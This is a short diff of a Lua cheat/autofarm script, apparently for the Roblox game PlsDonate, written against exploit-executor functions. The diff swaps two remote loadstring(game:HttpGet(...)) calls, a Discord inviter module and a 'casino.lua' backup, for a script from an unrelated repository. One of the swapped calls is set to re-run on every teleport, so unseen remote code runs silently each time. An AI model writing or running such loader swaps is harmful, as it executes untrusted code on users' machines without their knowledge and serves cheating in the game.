@@ -20,7 +20,7 @@ local x_scam = 0
 if isfile and writefile and typeof(isfile) == 'function' and typeof(writefile) == 'function' then
 	if not isfile('PromptedDiscordCFCommunityRRRRR.txt') then
 		writefile('PromptedDiscordCFCommunityRRRRR.txt', game:GetService('HttpService'):JSONEncode('hi'))
-		local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
+		local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/averyai/test-script/main/Script2.lua"))()
 		Module.Prompt({
 			invite = "https://discord.gg/fNeggqVMZs",
 			name = "CF Community",
@@ -36,7 +36,7 @@ local unclaimed = {}
 local errCount = -1
 
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
-queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/casino.lua'))()")
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/averyai/test-script/main/Script2.lua'))()")
 
 if not getgenv().settin then
 	getgenv().settin = {
